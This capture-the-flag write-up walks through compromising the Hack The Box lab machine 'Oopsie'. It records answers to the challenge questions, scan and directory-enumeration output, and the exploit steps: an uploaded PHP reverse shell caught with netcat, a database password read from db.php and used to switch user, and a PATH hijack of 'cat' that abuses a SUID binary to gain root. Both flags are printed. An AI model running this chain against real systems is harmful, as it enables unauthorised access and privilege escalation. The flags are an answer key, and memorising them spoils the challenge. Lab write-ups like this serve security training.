# Oopsie
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Oopsie
* Topic: PHP, SUID
* Difficulty: Very easy
* Date: 13-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. With what kind of tool can intercept web traffic? 
 - **proxy**
2. What is the path to the directory on the webserver that returns a login page? 
- **/cdn-cgi/login**
3. What can be modified in Firefox to get access to the upload page? 
- **cookie**
4. What is the access ID of the admin user?
- **34322**
5. On uploading a file, what directory does that file appear in on the server? 
- **/uploads**
6. What is the file that contains the password that is shared with the robert user? 
- **db.php**
7. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
- **find**
8. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 
- **root**
9. What SUID stands for? 
- **set owner user id**
10. What is the name of the executable being called in an insecure manner? 
 - **cat**
 11. Submit user flag 
  - **f2c74ee8db7983851ab2a96a44eb7981**

---
## Flag:
Nmap:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -n -sC -sV 10.129.12.64
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 14:54 EDT
Nmap scan report for 10.129.12.64
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```

The web page:

![](./attachments/Pasted%20image%2020220413210129.png)

Burp:

![](./attachments/Pasted%20image%2020220413212527.png)

The Login page:

![](./attachments/Pasted%20image%2020220413212739.png)

Login as guest:

![](./attachments/Pasted%20image%2020220413212943.png)

Cookies:

![](./attachments/Pasted%20image%2020220413213635.png)

Access:

![](./attachments/Pasted%20image%2020220413213808.png)

File Uploaded:

![](./attachments/Pasted%20image%2020220413215722.png)

Find upload dir:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir --url 10.129.12.64 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.12.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2022/04/13 15:05:29 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.129.12.64/images/]
/index.php            (Status: 200) [Size: 10932]                                
/themes               (Status: 301) [Size: 313] [--> http://10.129.12.64/themes/]
/uploads              (Status: 301) [Size: 314] [--> http://10.129.12.64/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.12.64/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.129.12.64/js/]     
/fonts                (Status: 301) [Size: 312] [--> http://10.129.12.64/fonts/]  
                                                                                  
===============================================================
2022/04/13 15:36:01 Finished
===============================================================
```

Reverse shell call.

`http://10.129.12.64/uploads/php-reverse-shell.php`

![](./attachments/Pasted%20image%2020220413220747.png)

Netcat:

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.12.64] 52642
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:07:00 up  1:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@oopsie:/$ 
```

We got the shell!

Looking around for a bit, we find `db.php`. 

```console 
www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php           
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ 
```

Great, now we are logged in as robert!

```console 
robert@oopsie:/$ cd ~
robert@oopsie:~$ ls
user.txt
robert@oopsie:~$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981

robert@oopsie:/$ cd tmp/
robert@oopsie:/tmp$ echo '/bin/sh' > cat
robert@oopsie:/tmp$ ls
cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 3
3
---------------
# whoami
root
```

And now as root!

```console
# pwd
/tmp
# rm cat
# cd /root
# ls
reports  root.txt
# cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```

The final flag!

**Flag:** `af13b0bee69f8a877c3faf667f7beacf`

---
**Tags:** [[HackTheBox]]